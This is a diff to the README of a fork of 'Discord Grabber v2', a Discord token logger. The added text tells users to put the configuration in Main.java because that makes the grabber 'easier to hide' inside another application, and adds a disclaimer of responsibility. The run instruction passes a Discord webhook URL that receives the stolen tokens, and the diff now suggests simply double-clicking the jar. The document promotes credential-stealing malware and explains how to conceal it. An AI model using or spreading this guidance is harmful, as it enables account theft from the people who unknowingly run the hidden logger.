@@ -8,6 +8,12 @@ Discord Grabber v2 is the second version of a discord token logger, improvements
 - Has embed and raw text
 - Checks for tokens in multiple locations
 
+## Why should I use this fork?
+This fork does not ```not``` uses a ```.txt``` file for configuration.
+You should configure it directly in the ```Main.java```.
+It's easier to hide it in your application.
+Remember: ```I am *not* responsible for your actions!```
+
 ## Features
 Current features include:
 
@@ -28,9 +34,9 @@ Current features include:
 
 The idea is to edit the source code yourself, edit the settings, and add the webhook. The release version  can be used but the settings can not be changed, and the webhook has to be passed as the first and only argument
 
-```java -jar <filename>.jar https://discord.com/api/webhooks/id/token```
+```Double-click it | or type in your terminal/cmd: java -jar <filename>.jar https://discord.com/api/webhooks/id/token```
 
-See Youtube video: https://youtu.be/ZC9lHFn2ekU
+See original Xefer-0 Youtube video: https://youtu.be/ZC9lHFn2ekU
 ## Contributing
 You may do with this code whatever you want, I would appreciate suggestions or if you tell me what you change, but it is not needed.
 
